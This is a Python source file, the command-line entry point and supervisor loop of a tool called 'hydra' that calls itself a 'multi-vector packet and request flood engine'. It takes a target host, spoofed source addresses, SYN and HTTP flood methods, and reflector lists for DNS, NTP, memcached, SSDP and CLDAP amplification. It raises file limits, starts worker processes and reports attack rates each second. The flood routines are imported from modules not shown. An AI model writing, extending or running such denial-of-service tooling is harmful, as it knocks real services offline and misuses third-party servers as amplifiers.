"""Argument parsing, preflight and the supervisor loop."""
from __future__ import annotations

import argparse
import multiprocessing as mp
import os
import resource
import signal
import socket
import sys
import time

from . import __version__
from .runtime import proc_main
from .vectors import RAW, VECTORS


def parse() -> tuple[argparse.Namespace, list[str]]:
    p = argparse.ArgumentParser(
        prog="hydra",
        description="multi-vector packet and request flood engine",
        epilog="raw vectors require root or CAP_NET_RAW",
    )
    p.add_argument("host", help="target host or IP")
    p.add_argument("-p", "--port", type=int, default=80)
    p.add_argument("-m", "--method", default="syn",
                   help="comma separated vectors, or 'all'")
    p.add_argument("-t", "--threads", type=int, default=8, help="total workers")
    p.add_argument("--procs", type=int, default=1)
    p.add_argument("-d", "--duration", type=int, default=60)
    p.add_argument("-r", "--rate", type=float, default=0,
                   help="ops per second per worker (0 = max)")
    p.add_argument("--spoof", default="auto", help="auto | off | CIDR")
    p.add_argument("--domain", default=None, help="suffix for DNS amplification")
    p.add_argument("--resolvers", default=None)
    p.add_argument("--ntp", default=None)
    p.add_argument("--memcached", default=None)
    p.add_argument("--ssdp", default=None)
    p.add_argument("--cldap", default=None)
    p.add_argument("--ua", default=None)
    p.add_argument("--ssl", action="store_true")
    p.add_argument("--path", default="/")
    p.add_argument("--http-method", default="GET")
    p.add_argument("--keepalive", action="store_true")
    p.add_argument("--junk", action="store_true", help="pad raw packets")
    p.add_argument("--check", action="store_true", help="report and exit")
    p.add_argument("-V", "--version", action="version", version=f"hydra {__version__}")
    a = p.parse_args()

    if a.method == "all":
        a.method = ",".join(VECTORS)
    sel = [m.strip() for m in a.method.split(",") if m.strip()]
    for m in sel:
        if m not in VECTORS:
            p.error(f"unknown vector: {m}")
    if a.ssl and a.port == 80:
        a.port = 443
    return a, sel


def preflight(selected: list[str]) -> None:
    if os.geteuid() != 0 and set(selected) & RAW:
        sys.exit("raw vectors need root; rerun with sudo or pick layer-7 vectors")
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))


def report(args, dst: str, selected: list[str]) -> None:
    print(f"version    : {__version__}")
    print(f"target     : {args.host} -> {dst}:{args.port}")
    print(f"vectors    : {', '.join(selected)}")
    print(f"procs      : {args.procs}   threads: {args.threads}")
    print(f"spoof      : {args.spoof}")
    print(f"rate/worker: {args.rate or 'unlimited'}")
    print(f"nofile     : {resource.getrlimit(resource.RLIMIT_NOFILE)[1]}")
    print(f"root       : {os.geteuid() == 0}")
    print("ok")


def main() -> None:
    args, selected = parse()
    try:
        dst = socket.gethostbyname(args.host)
    except socket.gaierror as exc:
        sys.exit(f"cannot resolve {args.host}: {exc}")
    preflight(selected)

    if args.check:
        report(args, dst, selected)
        return

    n = len(selected)
    shared = mp.Array("Q", args.procs * n)
    stop = mp.Event()
    signal.signal(signal.SIGINT, lambda *_: stop.set())

    procs = [
        mp.Process(target=proc_main,
                   args=(args, dst, selected, shared, i, stop, args.procs),
                   daemon=True)
        for i in range(args.procs)
    ]
    for p in procs:
        p.start()

    start = time.time()
    last = [0] * n
    try:
        while not stop.is_set() and time.time() - start < args.duration:
            time.sleep(1)
            cells = []
            for i, name in enumerate(selected):
                tot = sum(shared[j * n + i] for j in range(args.procs))
                cells.append(f"{name}={tot - last[i]}/s")
                last[i] = tot
            print(f"[{int(time.time() - start):4d}s] " + "  ".join(cells), flush=True)
    finally:
        stop.set()
        for p in procs:
            p.join(timeout=2)

    print("\ntotals:")
    for i, name in enumerate(selected):
        print(f"  {name}: {sum(shared[j * n + i] for j in range(args.procs))}")
